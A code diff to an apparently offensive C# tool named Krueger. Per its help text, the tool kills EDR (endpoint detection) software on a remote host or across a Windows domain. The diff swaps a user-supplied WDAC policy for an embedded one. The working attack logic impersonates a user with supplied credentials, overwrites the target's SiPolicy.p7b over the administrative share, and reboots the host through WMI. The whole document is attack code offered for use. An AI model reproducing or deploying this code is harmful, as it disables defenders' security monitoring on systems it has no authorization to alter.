@@ -21,8 +21,7 @@ namespace Krueger.Modules
                 "\t--domain                 -     Kill EDR across the domain\n" +
                 "\t--host <hostname>        -     Kill EDR on a specified host\n" +
                 "\t--username <user>        -     User to authenticate as\n" +
-                "\t--password <password>    -     Password for authenticating user\n" +
-                "\t--policy <policy file>   -     WDAC compiled policy to apply on the target(s)\n";
+                "\t--password <password>    -     Password for authenticating user\n";
 
             Console.WriteLine(help);
         }
@@ -75,11 +74,9 @@ namespace Krueger.Modules
                 string username = null;
                 string password = null;
                 string domain = null;
-                string policy = null;
-                string fullcompromise = null;
 
-                string[] flags = { "--host", "--username", "--password", "--policy", "--domain" };
-                string[] options = { "--fullcompromise" };
+                string[] flags = { "--host", "--username", "--password", "--domain" };
+                string[] options = { };
 
                 Dictionary<string, string> cmd = Parse(args, flags, options);
                 if (cmd == null)
@@ -91,63 +88,68 @@ namespace Krueger.Modules
                 cmd.TryGetValue("--username", out username);
                 cmd.TryGetValue("--password", out password);
                 cmd.TryGetValue("--domain", out domain);
-                cmd.TryGetValue("--policy", out policy);
-                cmd.TryGetValue("--fullcompromise", out fullcompromise);
 
                 if (host != null)
                 {
-                    if (policy != null)
+                    if (username != null || password != null)
                     {
-                        if (username != null || password != null)
+                        if (username != null && password != null)
                         {
-                            if (username != null && password != null)
+                            if (domain == null)
                             {
-                                if (domain == null)
-                                {
-                                    Domain d = Domain.GetCurrentDomain();
-                                    domain = d.Name;
-                                }
+                                Domain d = Domain.GetCurrentDomain();
+                                domain = d.Name;
+                            }
 
-                                Console.WriteLine("[+] Launching attack on " + host);
-                                AppDomain.CurrentDomain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal);
-                                IntPtr token = IntPtr.Zero;
-                                Console.WriteLine($"[+] Impersonating user with credentials: {domain}/{username}:{password}");
-                                Interop.LogonUser(username, domain, password, (int)LogonType.LOGON32_LOGON_BATCH, (int)LogonProvider.LOGON32_PROVIDER_DEFAULT, ref token);
-                                WindowsIdentity identity = new WindowsIdentity(token);
-                                WindowsImpersonationContext context = identity.Impersonate();
+                            Console.WriteLine("[+] Launching attack on " + host);
+                            AppDomain.CurrentDomain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal);
+                            IntPtr token = IntPtr.Zero;
+                            Console.WriteLine($"[+] Impersonating user with credentials: {domain}/{username}:{password}");
+                            Interop.LogonUser(username, domain, password, (int)LogonType.LOGON32_LOGON_BATCH, (int)LogonProvider.LOGON32_PROVIDER_DEFAULT, ref token);
+                            WindowsIdentity identity = new WindowsIdentity(token);
+                            WindowsImpersonationContext context = identity.Impersonate();
                             
-                                string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
-
-                                File.Copy(policy, target, true);
+                            string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
+                            
+                            byte[] policy = Modules.Policy.ReadPolicy();
+                            File.WriteAllBytes(target, policy);
                               
-                                Console.WriteLine("[+] Moved policy successfully");
-                                Reboot.reboot(host);
-                                context.Undo();
+                            Console.WriteLine("[+] Moved policy successfully");
+                            bool rebooted = Reboot.WmiReboot(host);
+                            context.Undo();
+                            if (rebooted)
+                            {
                                 Console.WriteLine("[+] Rebooted target");
-
                             }
                             else
                             {
-                                Console.WriteLine("[!] You must specify both a username and password");
+                                Console.WriteLine("[!] Target has not been rebooted");
                             }
+
                         }
                         else
                         {
-                            Console.WriteLine("[+] Launching attack on " + host);
-                            string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
-                            File.Copy(policy, target, true);
-                            Console.WriteLine("[+] Moved policy successfully");
-                            Reboot.reboot(host);
-                            Console.WriteLine("[+] Rebooted target");
+                            Console.WriteLine("[!] You must specify both a username and password");
                         }
-
                     }
                     else
                     {
-                        Console.WriteLine("[!] You must supply a WDAC policy to apply on the target");
-                    }
+                        Console.WriteLine("[+] Launching attack on " + host);
+                        string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
+                        byte[] policy = Modules.Policy.ReadPolicy();
+                        File.WriteAllBytes(target, policy);
+                        Console.WriteLine("[+] Moved policy successfully");
+                        bool rebooted = Reboot.WmiReboot(host);
+                        if (rebooted)
+                        {
+                            Console.WriteLine("[+] Rebooted target");
+                        }
+                        else
+                        {
+                            Console.WriteLine("[!] Target has not been rebooted");
+                        }
+                    } 
                 }
-
             }
             else
             {
